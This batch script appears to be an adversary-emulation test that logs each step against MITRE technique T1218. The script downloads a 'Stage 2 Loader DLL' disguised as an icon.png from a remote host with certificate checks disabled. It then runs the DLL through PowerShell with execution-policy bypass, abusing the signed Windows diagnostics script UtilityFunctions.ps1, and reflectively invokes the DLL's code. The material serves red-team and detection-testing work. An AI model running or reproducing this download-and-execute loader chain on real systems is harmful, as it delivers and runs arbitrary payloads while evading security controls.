@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations - random names
SET mfyxwb=%APPDATA%\10866\7ded6352
SET qjznlr=df9d28c2.txt
SET hpwvkb=https://10.0.0.49/stage/2/icon.png?10866-7
SET rku1dz=ITZEL-S2B
SET jt2oe9=10866
SET wqk8mx=7
SET vlby3a=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM ===== DEBUG: heartbeat_start =====
echo [!tsvar!][DEBUG][!rku1dz!][!jt2oe9!]: heartbeat_start>> "%vlby3a%" 2>nul

REM Step 1: Download Stage 2 Loader DLL via curl
curl -k -s -o "!mfyxwb!\!qjznlr!" "!hpwvkb!"

REM ===== DEBUG: heartbeat_complete =====
echo [!tsvar!][DEBUG][!rku1dz!][!jt2oe9!]: heartbeat_complete>> "%vlby3a%" 2>nul

REM Step 2: Change working directory to output directory
echo [!tsvar!][DEBUG][!rku1dz!][!jt2oe9!]: chdir_start>> "%vlby3a%" 2>nul
cd /d "!mfyxwb!" >nul 2>&1
echo [!tsvar!][DEBUG][!rku1dz!][!jt2oe9!]: chdir_result=!errorlevel!>> "%vlby3a%" 2>nul

REM Step 3: Invoke the Stage 2 Loader DLL via LOLBIN (PowerShell)
REM The PowerShell command uses {PHR_*} literals – DO NOT convert to !var! inside quotes
echo [!tsvar!][DEBUG][!rku1dz!][!jt2oe9!]: powershell_start>> "%vlby3a%" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin %APPDATA%\10866\7ded6352\\df9d28c2.txt; $a=[AppDomain]::CurrentDomain.GetAssemblies()|Select -Last 1; ($a.GetExportedTypes()|%{$_.GetMethods([Reflection.BindingFlags]'Public,Static')|?{$_.GetParameters().Count -eq 0}}|Select -First 1).Invoke($null,$null)"
set ps_err=!errorlevel!
echo [!tsvar!][DEBUG][!rku1dz!][!jt2oe9!]: powershell_result=!ps_err!>> "%vlby3a%" 2>nul

REM Step 4: Log TTP result (T1218 System Binary Proxy Execution)
if !ps_err! equ 0 (
    set result=OK
    set errinfo=
) else (
    set result=FAIL
    set errinfo=exitcode=!ps_err!
)
echo [!tsvar!][TTP][!rku1dz!][!jt2oe9!]: T1218|System Binary Proxy Execution=!result!:!errinfo!>> "%vlby3a%" 2>nul

REM Done - script exits